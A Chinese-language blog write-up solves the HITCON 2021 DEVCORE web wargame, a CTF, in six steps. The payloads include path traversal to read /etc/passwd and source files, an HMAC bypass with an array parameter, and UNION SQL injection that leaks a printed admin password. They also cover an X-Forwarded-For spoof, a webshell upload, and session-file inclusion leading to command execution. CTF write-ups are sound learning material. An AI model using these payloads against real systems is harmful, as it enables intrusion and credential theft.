---
title: HITCON 2021 - DEVCORE Wargame Writeups
date: 2021-12-05 13:11:59
tags:
    - ctf
---

官方 src : https://github.com/DEVCORE-Wargame/HITCON-2021

沒想到自己也能有把 DEVCORE 題目破台的一天 痛哭流涕 QQ

![](https://i.imgur.com/QEnOzak.png)

<!-- more -->

雖然我是照弱點順序寫 writeup
但其實我在打的的時候是 1 -> 3 -> 4 -> 5 -> 6 -> 2
完全忽略了 broken access 這個超常見的洞然後找不到 flag XD

# 弱點 01：Path Traversal

從 `image.php` 的 GET 變數 id 可以發現是 base64 後的檔案名稱
猜測可以進行 LFI
用 `http://web.ctf.devcore.tw/image.php?id=Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==` 驗證可以取得 `/etc/passwd`
但我們不知道 web root 位置
因此使用 `/proc/self/cwd/`
最後發現 flag 在 `include.php` 中

- payload
```
http://web.ctf.devcore.tw/image.php?id=Li4vLi4vLi4vLi4vcHJvYy9zZWxmL2N3ZC9pbmNsdWRlLnBocA==
```

![](https://i.imgur.com/GufOcNo.png)



- flag : `DEVCORE{no.1_path_traverse_to_the_m00n}`

---

# 弱點 02：Broken Access Control

這邊其實我是 RCE 才回頭撈 db 的 wwwww

原本思路應該是
從 `order.php` 中可以看到傳入的 GET 參數 `sig` 被傳進 `get_sig_hash()` 後跟 db 內的 `sig_hash` 比較
在條件中 先檢查了 hash_sig 後才跟 db 比較
`get_sig_hash()` 最後是返回 `hash_hmac()` 的結果
如果傳進去的 `data` 是一個陣列而不是一個字串則會返回 `false` 從而繞過比較

- payload
```
http://web.ctf.devcore.tw/order.php?id=1&sig[]=aaa
```

![](https://i.imgur.com/BE5Bbwm.png)

- flag : `DEVCORE{no.2_bre8k_acc3ss_c0ntrol}`

---

# 弱點 03：SQL Injection

從 `print.php` 中可以發現未對 GET 變數 `id` 進行過濾
且直接將 id 串接至 sql 語句
利用 union based leak 出所有 db 結構
```
http://web.ctf.devcore.tw/print.php?sig=1&id=-1%20union%20select%201,2,group_concat(column_name),4,5,6,7,8,9%20from%20information_schema.columns%20where%20table_name=%27items%27
```

- web
    - items
        - id,title,description
    - rate_limit
        - ip,last_visit,visit_times
    - orders
        - id,name,email,phone,status,sig_hash,order_date,address,note
    - options
        - key,value
    - backend_users
        - id,username,password,description

- payload
```
http://web.ctf.devcore.tw/print.php?sig=1&id=-1%20union%20select%201,2,group_concat(description),4,5,6,7,8,9%20from%20backend_users
```

- admin creds
    - `admin:u=479_p5jV:Fsq(2`

![](https://i.imgur.com/Vb1lOZy.png)

- flag : `DEVCORE{no.3_sql_injection_my_passw0rd_is_y0urs}`

---

# 弱點 04：Use of Less Trusted Source

從 `/proc/self/mounts` leak 出的後台地址位於 `/usr/share/nginx/b8ck3nd/`
並且得知後台的`include.php` 中有檢查連線 IP 是否來自指定 IP
可以透過 `X-Forwarded-For` 偽造
並且只用弱點 03 得到的 admin 帳密進行登入

- payload
```bash
curl -H "X-Forwarded-For: 127.0.0.1" -b "PHPSESSID=dvcj3di7tqkfl3p67qikjvnckh"  "http://web.ctf.devcore.tw/b8ck3nd/"
```

![](https://i.imgur.com/jMl4rPe.png)

- flag : `DEVCORE{no.4_x-forward-for_2b_or_n0t_2b}`

---

# 弱點 05：Unrestricted File Upload

在 `/b8ck3nd/upload.php` 中
存在 POST 變數 `rename` 跟 `folder` 可以自訂檔名以及路徑
上傳 webshell 後就彈出 flag 了

- payload
```bash
curl -X POST -H "X-Forwarded-For: 127.0.0.1" -b "PHPSESSID=dvcj3di7tqkfl3p67qikjvnckh" -F "file=@chess.php" -F "rename=chess.php" -F "folder=../../../../tmp" "http://web.ctf.devcore.tw/b8ck3nd/upload.php"
```

![](https://i.imgur.com/7CWHJUS.png)


- flag : `DEVCORE{no.5_file_uploaded_wheres_my_sh3ll}`

---

# 弱點 06：Local File Inclusion

利用弱點 05 覆蓋自己的 session
利用 `include.php` 中會對 `$_SESSION['lang']` 進行 include
寫入 web shell 且複寫 session file 達到 RCE

- sess_xxx
    `lang|s:27:"../../../../../../tmp/chess";`
    
- payload
```bash
curl -X POST -b "PHPSESSID=dvcj3di7tqkfl3p67qikjvnckh" -H "X-Forwarded-For: 127.0.0.1" -F "file=@sess_dvcj3di7tqkfl3p67qikjvnckh" -F "rename=sess_dvcj3di7tqkfl3p67qikjvnckh" -F "folder=../../../../tmp" "http://web.ctf.devcore.tw/b8ck3nd/upload.php"
```
```
http://web.ctf.devcore.tw/?cmd=/readflag
```



![](https://i.imgur.com/WB8RwuV.png)

- flag : `DEVCORE{no.6_local_file_include_t0_rescu3}`